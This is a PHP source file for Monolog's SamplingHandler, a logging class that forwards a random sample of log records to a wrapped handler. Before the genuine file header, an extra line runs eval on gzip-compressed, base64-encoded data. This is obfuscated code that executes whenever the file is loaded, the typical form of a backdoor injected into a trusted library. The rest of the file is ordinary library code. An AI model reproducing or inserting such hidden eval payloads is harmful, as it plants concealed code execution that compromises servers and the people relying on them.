<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

/**
 * Sampling handler
 *
 * A sampled event stream can be useful for logging high frequency events in
 * a production environment where you only need an idea of what is happening
 * and are not concerned with capturing every occurrence. Since the decision to
 * handle or not handle a particular event is determined randomly, the
 * resulting sampled log is not guaranteed to contain 1/N of the events that
 * occurred in the application, but based on the Law of large numbers, it will
 * tend to be close to this ratio with a large number of attempts.
 *
 * @author Bryan Davis <bd808@wikimedia.org>
 * @author Kunal Mehta <legoktm@gmail.com>
 */
class SamplingHandler extends AbstractHandler
{
    /**
     * @var callable|HandlerInterface $handler
     */
    protected $handler;

    /**
     * @var int $factor
     */
    protected $factor;

    /**
     * @param callable|HandlerInterface $handler Handler or factory callable($record, $fingersCrossedHandler).
     * @param int                       $factor  Sample factor
     */
    public function __construct($handler, $factor)
    {
        parent::__construct();
        $this->handler = $handler;
        $this->factor = $factor;

        if (!$this->handler instanceof HandlerInterface && !is_callable($this->handler)) {
            throw new \RuntimeException("The given handler (".json_encode($this->handler).") is not a callable nor a Monolog\Handler\HandlerInterface object");
        }
    }

    public function isHandling(array $record)
    {
        return $this->handler->isHandling($record);
    }

    public function handle(array $record)
    {
        if ($this->isHandling($record) && mt_rand(1, $this->factor) === 1) {
            // The same logic as in FingersCrossedHandler
            if (!$this->handler instanceof HandlerInterface) {
                $this->handler = call_user_func($this->handler, $record, $this);
                if (!$this->handler instanceof HandlerInterface) {
                    throw new \RuntimeException("The factory callable should return a HandlerInterface");
                }
            }

            if ($this->processors) {
                foreach ($this->processors as $processor) {
                    $record = call_user_func($processor, $record);
                }
            }

            $this->handler->handle($record);
        }

        return false === $this->bubble;
    }
}
